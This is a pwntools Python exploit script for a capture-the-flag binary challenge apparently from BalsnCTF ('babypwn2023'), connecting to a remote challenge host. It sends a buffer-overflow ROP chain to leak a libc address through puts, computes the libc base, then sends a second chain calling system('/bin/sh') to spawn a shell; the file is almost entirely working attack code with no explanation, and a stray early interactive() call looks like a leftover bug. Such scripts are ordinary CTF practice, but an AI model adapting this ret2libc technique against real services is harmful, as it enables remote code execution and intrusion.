from pwn import *

file = ELF("./chall_patched")
libc = ELF("./libc.so.6")

script = """
b *0x4011a0
c
"""

if args.GDB:
    p = gdb.debug("./chall", gdbscript=script)
elif args.REMOTE:
    p = remote("babypwn2023.balsnctf.com", 10105)
else:
    p = process("./chall_patched")

putsrax = p64(0x004011b8)
poprbp = p64(0x000000000040115d)
getsrbp = p64(0x004011a0)
main = p64(file.sym.main)
ret = p64(0x004011c6)

poprdi = 0x000000000002a3e5

# chain = b"A" * 32
# chain += p64(file.bss(0x800))
# chain += poprbp
# chain += p64(file.bss(0x800 + 0x20))
# chain += getsrbp
# p.sendline(chain)

chain = b"A" * 32
chain += p64(file.bss(0x800 + 0x40))
chain += p64(file.sym.deregister_tm_clones)
chain += ret
chain += putsrax
chain = chain.ljust(0x40, b"\x00")
chain += b"ABCDEFGH"
chain += main
#gdb.attach(p)
p.sendline(chain)

p.interactive()
#log.info(p.recvline())
#log.info(p.recvline())
leak = p.recvline().strip()
leak = p.recvline().strip()
print(leak)
#log.info(f"leak: {leak}")
leak = u64(leak.ljust(8, b"\x00"))
log.info(f"leak: {leak:x}")
libcbase = leak - libc.sym._IO_2_1_stdout_
log.info(f"libcbase: {libcbase:x}")

chain = b"A" * 40
chain += p64(libcbase + poprdi)
chain += p64(libcbase + next(libc.search(b"/bin/sh\x00")))
chain += p64(libcbase + libc.sym.system)
p.sendline(chain)

p.interactive()
